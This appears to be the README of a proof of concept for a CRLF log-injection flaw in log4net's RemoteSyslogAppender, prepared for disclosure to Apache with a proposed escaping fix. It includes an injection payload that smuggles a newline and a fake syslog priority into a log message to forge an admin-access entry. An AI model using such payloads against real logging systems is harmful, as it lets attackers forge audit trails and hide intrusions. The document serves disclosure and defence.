# PoC: CRLF Injection in log4net RemoteSyslogAppender

## Vulnerability

CWE-117: Log injection via CRLF in RemoteSyslogAppender - allows forging syslog entries.

**Vulnerable file:** `src/log4net/Appender/RemoteSyslogAppender.cs` (lines 397-405)

## Why Vulnerable?

Code doesn't sanitize `\n` and `\r` before sending to syslog via UDP. Result:
- 1 log call → multiple syslog entries
- Attacker can inject fake priority `<134>` etc
- Can forge audit logs

## Quick Test

```bash
cd Log4netCRLFPoC
dotnet run
```

Expected:
- Test 1: 1 entry (normal)
- Test 2: **2 entries** ← vulnerability confirmed
- Test 3: 3 entries
- Test 4-6: multiple entries

## Attack Example

```csharp
log.Info("alice\n<134>FORGED: Admin access granted");
```

Becomes 2 syslog entries:
```
<134>log4net-poc: alice
<134>log4net-poc: <134>FORGED: Admin access granted  ← FAKE!
```

## Impact

- Forge audit logs
- Hide malicious activity
- SIEM bypass
- Compliance violation

## Fix

Escape CRLF before sending:
```csharp
message.Replace("\r", "\\r").Replace("\n", "\\n")
```

## Files

- `Program.cs` - 6 test cases
- `App.config` - RemoteSyslogAppender config (localhost:514)
- `TESTING-GUIDE.md` - Testing instructions

## Submit to Apache

```
security@apache.org
Subject: CWE-117 CRLF Injection in RemoteSyslogAppender
Attach: PoC code + screenshot
```
